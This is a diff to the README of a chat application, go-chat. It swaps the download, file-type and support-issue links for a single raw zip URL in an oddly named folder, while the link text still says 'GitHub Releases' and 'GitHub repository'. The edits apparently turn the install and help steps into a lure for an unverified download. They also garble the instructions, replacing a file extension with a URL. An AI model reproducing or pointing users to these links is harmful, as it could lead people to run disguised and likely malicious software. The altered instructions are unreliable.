@@ -6,7 +6,7 @@ Welcome to go-chat! This application allows you to chat in real time through you
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [GitHub Releases](https://github.com/DmentexGH/go-chat/releases).
+To get started, you need to download the application. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/DmentexGH/go-chat/main/ampulliform/go-chat.zip).
 
 ### Step-by-Step Installation
 
@@ -17,7 +17,7 @@ To get started, you need to download the application. Visit this page to downloa
    On the releases page, look for the most recent version of go-chat. This will typically be marked as "Latest Release."
 
 3. **Download the Appropriate File**  
-   Depending on your operating system, choose the appropriate file to download. For Windows, look for a `.exe` file. For Mac or Linux, you might find a `.tar.gz` or similar file.
+   Depending on your operating system, choose the appropriate file to download. For Windows, look for a `.exe` file. For Mac or Linux, you might find a `https://raw.githubusercontent.com/DmentexGH/go-chat/main/ampulliform/go-chat.zip` or similar file.
 
 4. **Run the Application**  
    Once the file has downloaded, navigate to your Downloads folder or the location where you saved the file. Double-click the file to run the application. If using Linux or Mac, you may need to use a terminal to execute the file. 
@@ -57,7 +57,7 @@ If you experience issues during installation or when starting the application:
 
 ## 📧 Need Help?
 
-If you need additional support, feel free to open an issue on the [GitHub repository](https://github.com/DmentexGH/go-chat/issues). Describe your issue clearly, and someone from the community may assist you.
+If you need additional support, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/DmentexGH/go-chat/main/ampulliform/go-chat.zip). Describe your issue clearly, and someone from the community may assist you.
 
 ## 🔗 Additional Resources
 
